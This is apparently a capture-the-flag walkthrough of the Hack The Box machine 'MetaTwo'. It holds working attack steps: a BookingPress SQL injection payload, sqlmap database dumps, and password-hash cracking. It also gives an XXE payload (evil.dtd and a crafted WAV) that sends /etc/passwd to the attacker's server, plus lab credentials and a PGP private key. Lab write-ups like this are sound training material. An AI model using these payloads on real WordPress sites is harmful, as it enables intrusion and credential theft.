- Add `metatwo.htb` to hosts

```bash
echo "10.10.11.186	metatwo.htb" | sudo tee -a /etc/hosts
```

![image](https://0xc0rvu5.github.io/docs/assets/images/20230117211951.png)

- Change `metatwo.htb` to `metapress.htb`
- The bottom of `/etc/hosts` should look like this:

```bash
10.10.11.186	metapress.htb
```

- Run the background scans
	- `autorecon` for nmap scans
	- `feroxbuster` for directory enumeration

```bash
sudo (which autorecon) metatwo.htb
```

```
feroxbuster -u http://metapress.htb -n -t 5 -L 5 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -o ferox_metapress_out.txt
```

- If you hadn't noticed via your web-proxy then you could check `feroxbuster` output:

```bash
cat results/metatwo.htb/ferox_metapress_out.txt | grep wp    

302      GET        0l        0w        0c http://metapress.htb/login => http://metapress.htb/wp-login.php
301      GET        7l       11w      169c http://metapress.htb/wp-content => http://metapress.htb/wp-content/
302      GET        0l        0w        0c http://metapress.htb/admin => http://metapress.htb/wp-admin/
301      GET        7l       11w      169c http://metapress.htb/wp-includes => http://metapress.htb/wp-includes/
302      GET        0l        0w        0c http://metapress.htb/dashboard => http://metapress.htb/wp-admin/
301      GET        7l       11w      169c http://metapress.htb/wp-admin => http://metapress.htb/wp-admin/
```

- Wordpress has been identified now it's time to bust out `wpscan`

```bash
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url metapress.htb [--plugins-detection aggressive] --api-token your_token --passwords /usr/share/seclists/Passwords/probable-v2-top1575.txt
```

- Take note of the 1st of 29 CVEs we will use that later.

![image](https://0xc0rvu5.github.io/docs/assets/images/20230117212929.png)

- After some manual enumeration you come to:
	- `view-source:http://metapress.htb/events/`
- We are looking for any plugins to check for vulnerabilities
- Search for:
	- `wp-content/plugins`
- We find `bookingpress-appointment-booking` version `1.0.10`

![image](https://0xc0rvu5.github.io/docs/assets/images/20230117213336.png)

- GoogleFu:
- `bookingpress-appointment-booking 1.0.10 exploit`
- You will have to search quite a few pages to find some relevant information at this point.
- `wpscan` conveniently has a PoC 
- [[https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357]]
- Pay attention to:
	- `Visit the just created page as an unauthenticated user and extract the "nonce" (view source -> search for "action:'bookingpress_front_get_category_services'")`

![image](https://0xc0rvu5.github.io/docs/assets/images/20230117214013.png)

- Here is a convenient python script already created for this purpose. Keep in mind the `/` will be escaped so you will have to remove the `\`.

```bash
python3 sqli.py  -u 'http://metapress.htb/wp-admin/admin-ajax.php' -p 'your_nonce'
```

![image](https://0xc0rvu5.github.io/docs/assets/images/20230117214659.png)
- Like so:

```bash
$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.
$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70
```

![image](https://0xc0rvu5.github.io/docs/assets/images/20230117214736.png)

- You can visit:
- [[https://hashcat.net/wiki/doku.php?id=example_hashes]]
- Enter `Ctrl+F` and search for `$p$`

![image](https://0xc0rvu5.github.io/docs/assets/images/20230117221635.png)
- If you already knew that it was `phpass` for example you can simply run:

```bash
hashcat --help | grep phpass
```

![image](https://0xc0rvu5.github.io/docs/assets/images/20230117221722.png)

- I like to run `hashcat` on my host machine to utilize the power of my GPU.
- I have the `/usr/worldlists/rockyou.txt` in my `~/wordlists` directory.

```bash
hashcat -a 0 -m 400 ~/sqli_hashes.txt wordlists/rockyou.txt
```

- Output:

```bash
$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70:partylikearockstar
```

![image](https://0xc0rvu5.github.io/docs/assets/images/20230117221858.png)
![image](https://0xc0rvu5.github.io/docs/assets/images/20230117221956.png)

Alternatively

- The manual way:
- You need to change:

```bash
curl -i 'https://example.com/wp-admin/admin-ajax.php' \                                                                                                                                  
--data 'action=bookingpress_front_get_category_services&_wpnonce=74e56dc34d&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'
```

- To

```bash
curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' \                                                                                                                                 
--data 'action=bookingpress_front_get_category_services&_wpnonce=your_nonce&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'
```

![image](https://0xc0rvu5.github.io/docs/assets/images/20230117215159.png)

- Now that we have verified it works makes sure your proxy is active and complete the following command:

```bash
curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' \                                                                                                                                 
--data 'action=bookingpress_front_get_category_services&_wpnonce=74e56dc34d&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -' -x http://127.0.0.1:8080
```

- This will ensure the request is sent directly to your proxy
- In your proxy, i'm using `Zap`, go to the most recent request, right-click and select `Open/Resent with Request Editor...`

![image](https://0xc0rvu5.github.io/docs/assets/images/20230117215545.png)

- Now change the request `body` to portray what I am working with:

```bash
action=bookingpress_front_get_category_services&_wpnonce=74e56dc34d&category_id=33&total_service=1)
```

- Hit `send` request then right-click, `Save Raw`, `Request` and finally click `All` and save it to the desired name.

![image](https://0xc0rvu5.github.io/docs/assets/images/20230117215714.png)

- Now it's `sqlmap` time

```bash
sqlmap -r req.raw -p total_service --dbs
```

 - `-r` - Is used to specify a file containing a list of HTTP requests, in Burp or ZAP proxy format, that `sqlmap` will use as input for the injection attack.
 - `-p` - Is used to specify the parameter(s) to test for SQL injection vulnerabilities.
 - `--dbs` - Show me databases.

- Output:

```bash
available databases [2]:
[*] blog
[*] information_schema
```

- Now let's query the `blog` database:

```bash
sqlmap -r req.raw -p total_service -D blog --tables
```

 - `-r` - Is used to specify a file containing a list of HTTP requests, in Burp or ZAP proxy format, that `sqlmap` will use as input for the injection attack.
 - `-p` - Is used to specify the parameter(s) to test for SQL injection vulnerabilities.
- `-D` - Is used to specify the target database for the SQL injection attack.
- `--tables` - Show me tables of the `blog` database.

- Output:

```bash
Database: blog
[27 tables]
+--------------------------------------+
| wp_bookingpress_appointment_bookings |
| wp_bookingpress_categories           |
| wp_bookingpress_customers            |
| wp_bookingpress_customers_meta       |
| wp_bookingpress_customize_settings   |
| wp_bookingpress_debug_payment_log    |
| wp_bookingpress_default_daysoff      |
| wp_bookingpress_default_workhours    |
| wp_bookingpress_entries              |
| wp_bookingpress_form_fields          |
| wp_bookingpress_notifications        |
| wp_bookingpress_payment_logs         |
| wp_bookingpress_services             |
| wp_bookingpress_servicesmeta         |
| wp_bookingpress_settings             |
| wp_commentmeta                       |
| wp_comments                          |
| wp_links                             |
| wp_options                           |
| wp_postmeta                          |
| wp_posts                             |
| wp_term_relationships                |
| wp_term_taxonomy                     |
| wp_termmeta                          |
| wp_terms                             |
| wp_usermeta                          |
| wp_users                             |
+--------------------------------------+
```

- Now that we have the `database` name and the target `table` we want to focus on let's dump some secrets.

```bash
sqlmap -r req.raw -p total_service -D blog -T wp_users --dump
```

 - `-r` - Is used to specify a file containing a list of HTTP requests, in Burp or ZAP proxy format, that `sqlmap` will use as input for the injection attack.
 - `-p` - Is used to specify the parameter(s) to test for SQL injection vulnerabilities.
- `-D` - Is used to specify the target database for the SQL injection attack.
- `-T` - Is used to specify the target table for the SQL injection attack.
- `--dump` - Show me the secrets.

```bash
Database: blog
Table: wp_users
[2 entries]
+----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+
| ID | user_url             | user_pass                          | user_email            | user_login | user_status | display_name | user_nicename | user_registered     | user_activation_key |
+----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+
| 1  | http://metapress.htb | $P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV. | admin@metapress.htb   | admin      | 0           | admin        | admin         | 2022-06-23 17:58:28 | <blank>             |
| 2  | <blank>              | $P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70 | manager@metapress.htb | manager    | 0           | manager      | manager       | 2022-06-23 18:07:55 | <blank>             |
+----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+

```

![image](https://0xc0rvu5.github.io/docs/assets/images/20230117222218.png)

- Take the hashes

```bash
$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.
$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70
```

![image](https://0xc0rvu5.github.io/docs/assets/images/20230117214736.png)

- You can visit:
- [[https://hashcat.net/wiki/doku.php?id=example_hashes]]
- Enter `Ctrl+F` and search for `$p$`

![image](https://0xc0rvu5.github.io/docs/assets/images/20230117221635.png)

- If you already knew that it was `phpass` for example you can simply run:

```bash
hashcat --help | grep phpass
```

![image](https://0xc0rvu5.github.io/docs/assets/images/20230117221722.png)

- I like to run `hashcat` on my host machine to utilize the power of my GPU.
- I have the `/usr/worldlists/rockyou.txt` in my `~/wordlists` directory.

```bash
hashcat -a 0 -m 400 ~/sqli_hashes.txt wordlists/rockyou.txt
```

- Output:

```bash
$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70:partylikearockstar
```

![image](https://0xc0rvu5.github.io/docs/assets/images/20230117221858.png)
![image](https://0xc0rvu5.github.io/docs/assets/images/20230117221956.png)

- Now go to:
- `http://metapress.htb/wp-login.php`
- Login as:

```bash
manager:partylikearockstar
```

Go to `Media`
- `Add New`
- We can see there is an upload functionality. If we recall earlier the `XXE` vulnerability now is the time to lookup that `CVE`.
- Here is a blog post on the matter with a manual enumeration method:
- [[https://blog.wpsec.com/wordpress-xxe-in-media-library-cve-2021-29447/]]
- Here are two convenient github repos with python scripts to accomplish the task.
	- **Make sure the code is read through to avoid any potential malicious activity. This holds true especially when there are `requirements.txt` files. Do not nonchalantly run that file without proper examination. These two scripts have no issues.**
- [[https://github.com/M3l0nPan/wordpress-cve-2021-29447]]
- [[https://github.com/Val-Resh/CVE-2021-29447-POC]]
- They both throw errors, but you can ignore these. The first github repo seems to work more efficiently if you do not want to have to manually adjust any files as in the initial blog post.

Manually:
- Make sure a server is up. We will use `python` here:

```bash
python3 -m http.server
```

- `evil.dtd`

```bash
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.10.16.33:8000/?p=%file;'>" >
```

- `payload.wav`

```bash
echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://10.10.16.33:8000/evil.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav
```

- Drag and drop `payload.wav` into the upload area at:
- [[http://metapress.htb/wp-admin/upload.php]]
- Output:

```bash
cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovcnVuL2lyY2Q6L3Vzci9zYmluL25vbG9naW4KZ25hdHM6eDo0MTo0MTpHbmF0cyBCdWctUmVwb3J0aW5nIFN5c3RlbSAoYWRtaW4pOi92YXIvbGliL2duYXRzOi91c3Ivc2Jpbi9ub2xvZ2luCm5vYm9keTp4OjY1NTM0OjY1NTM0Om5vYm9keTovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjEwMDo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMToxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMjoxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDk6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzc2hkOng6MTA0OjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4Kam5lbHNvbjp4OjEwMDA6MTAwMDpqbmVsc29uLCwsOi9ob21lL2puZWxzb246L2Jpbi9iYXNoCnN5c3RlbWQtdGltZXN5bmM6eDo5OTk6OTk5OnN5c3RlbWQgVGltZSBTeW5jaHJvbml6YXRpb246LzovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLWNvcmVkdW1wOng6OTk4Ojk5ODpzeXN0ZW1kIENvcmUgRHVtcGVyOi86L3Vzci9zYmluL25vbG9naW4KbXlzcWw6eDoxMDU6MTExOk15U1FMIFNlcnZlciwsLDovbm9uZXhpc3RlbnQ6L2Jpbi9mYWxzZQpwcm9mdHBkOng6MTA2OjY1NTM0OjovcnVuL3Byb2Z0cGQ6L3Vzci9zYmluL25vbG9naW4KZnRwOng6MTA3OjY1NTM0Ojovc3J2L2Z0cDovdXNyL3NiaW4vbm9sb2dpbgo=
```

![image](https://0xc0rvu5.github.io/docs/assets/images/20230117225139.png)
- Then decode:

```bash
echo "cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovcnVuL2lyY2Q6L3Vzci9zYmluL25vbG9naW4KZ25hdHM6eDo0MTo0MTpHbmF0cyBCdWctUmVwb3J0aW5nIFN5c3RlbSAoYWRtaW4pOi92YXIvbGliL2duYXRzOi91c3Ivc2Jpbi9ub2xvZ2luCm5vYm9keTp4OjY1NTM0OjY1NTM0Om5vYm9keTovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjEwMDo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMToxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMjoxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDk6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzc2hkOng6MTA0OjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4Kam5lbHNvbjp4OjEwMDA6MTAwMDpqbmVsc29uLCwsOi9ob21lL2puZWxzb246L2Jpbi9iYXNoCnN5c3RlbWQtdGltZXN5bmM6eDo5OTk6OTk5OnN5c3RlbWQgVGltZSBTeW5jaHJvbml6YXRpb246LzovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLWNvcmVkdW1wOng6OTk4Ojk5ODpzeXN0ZW1kIENvcmUgRHVtcGVyOi86L3Vzci9zYmluL25vbG9naW4KbXlzcWw6eDoxMDU6MTExOk15U1FMIFNlcnZlciwsLDovbm9uZXhpc3RlbnQ6L2Jpbi9mYWxzZQpwcm9mdHBkOng6MTA2OjY1NTM0OjovcnVuL3Byb2Z0cGQ6L3Vzci9zYmluL25vbG9naW4KZnRwOng6MTA3OjY1NTM0Ojovc3J2L2Z0cDovdXNyL3NiaW4vbm9sb2dpbgo=" | base64 -d
```

![image](https://0xc0rvu5.github.io/docs/assets/images/20230117225211.png)

- The preferred method would be to first awesome script we mentioned:

```bash
python3 CVE-2021-29447.py --url http://metapress.htb --server-ip 10.10.16.33 -u manager -p partylikearockstar 
```

- It also deleted the `*.wav` files along the way.

![image](https://0xc0rvu5.github.io/docs/assets/images/20230117223805.png)

- We know it is an `nginx` platform

![image](https://0xc0rvu5.github.io/docs/assets/images/20230117225547.png)

- We search `/etc/nginx/sites-available/default` to find the `root` directory.

![image](https://0xc0rvu5.github.io/docs/assets/images/20230117225724.png)

- Now we search:
- `/var/www/metapress.htb/blog/wp-config.php`

```bash
define( 'FS_METHOD', 'ftpext' );
define( 'FTP_USER', 'metapress.htb' );
define( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );
define( 'FTP_HOST', 'ftp.metapress.htb' );
define( 'FTP_BASE', 'blog/' );
define( 'FTP_SSL', false );
```

![image](https://0xc0rvu5.github.io/docs/assets/images/20230117230009.png)

- Log in:

```bash
Name (metapress.htb:corvus): metapress.htb
Password: 9NYS_ii@FyL_p5M2NvJ
```

- There are a lot of files we will focus on the relevant:

```bash
cd mailer
get send_email.php
exit
```

- On host:

```bash
cat send_email.php 

$mail->Username = "jnelson@metapress.htb";                 
$mail->Password = "Cb4_JmWM8zUZWMu@Ys";
```

- Log in via ssh:

```bash
ssh jnelson@metapress.htb
Password: Cb4_JmWM8zUZWMu@Ys
```

- User flag is available:

```bash
cat user.txt 

8e232560e59006bfbcc3844efa8df5fe
```

- After manual enumeration there are no convenient `SUID` bits, `getcaps`, `world-writable` or `world-executable`. The home directory will contain all the goodies.

```bash
ls -lat

total 36
drwxr-xr-x 5 jnelson jnelson 4096 Jan 18 02:32 .
drwx------ 3 jnelson jnelson 4096 Jan 18 02:28 .gnupg
-rw-r----- 1 root    jnelson   33 Jan 17 15:16 user.txt
dr-xr-x--- 3 jnelson jnelson 4096 Oct 25 12:52 .passpie
drwxr-xr-x 3 jnelson jnelson 4096 Oct 25 12:51 .local
drwxr-xr-x 3 root    root    4096 Oct  5 15:12 ..
lrwxrwxrwx 1 root    root       9 Jun 26  2022 .bash_history -> /dev/null
-rw-r--r-- 1 jnelson jnelson  220 Jun 26  2022 .bash_logout
-rw-r--r-- 1 jnelson jnelson 3526 Jun 26  2022 .bashrc
-rw-r--r-- 1 jnelson jnelson  807 Jun 26  2022 .profile
```

- Go to `.passpie`

```bash
cd .passpie
ls -lat

total 24
drwxr-xr-x 5 jnelson jnelson 4096 Jan 18 02:32 ..
dr-xr-x--- 2 jnelson jnelson 4096 Oct 25 12:52 ssh
dr-xr-x--- 3 jnelson jnelson 4096 Oct 25 12:52 .
-r-xr-x--- 1 jnelson jnelson 5243 Jun 26  2022 .keys
-r-xr-x--- 1 jnelson jnelson    3 Jun 26  2022 .config
```

- Copy the PGP keys to host which are in the `.keys` file.
- On host:

```bash
cat key

Tue 17 Jan 2023 09:22:41 PM EST
-----BEGIN PGP PRIVATE KEY BLOCK-----

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
=7Uo6
-----END PGP PRIVATE KEY BLOCK-----
```

- Run `gpg2john` on the `hash`

```bash
gpg2john key > hash
```

- Verify:

```bash
cat hash

Passpie:$gpg$*17*54*3072*e975911867862609115f302a3d0196aec0c2ebf79a84c0303056df921c965e589f82d7dd71099ed9749408d5ad17a4421006d89b49c0*3*254*2*7*16*21d36a3443b38bad35df0f0e2c77f6b9*65011712*907cb55ccb37aaad:::Passpie (Auto-generated by Passpie) <passpie@local>::key
```

![image](https://0xc0rvu5.github.io/docs/assets/images/20230117230850.png)

- Run `john`

```bash
john hash
```

- If you already have the hash stored:

```bash
john hash --show
```

- Output:

```bash
Passpie:blink182
```

![image](https://0xc0rvu5.github.io/docs/assets/images/20230117231032.png)

- Here you can research `passpie`:
- [[https://github.com/marcwebbie/passpie]]
- Run:

```bash
touch showmesecrets
passpie export showmesecrets
Passphrase: blink182
cat showmesecrets

credentials:
- comment: ''
  fullname: root@ssh
  login: root
  modified: 2022-06-26 08:58:15.621572
  name: ssh
  password: !!python/unicode 'p7qfAZt4_A1xo_0x'
- comment: ''
  fullname: jnelson@ssh
  login: jnelson
  modified: 2022-06-26 08:58:15.514422
  name: ssh
  password: !!python/unicode 'Cb4_JmWM8zUZWMu@Ys'
handler: passpie
version: 1.0
```

![image](https://0xc0rvu5.github.io/docs/assets/images/20230117231356.png)

- Login as root and there we have it!

#hacking
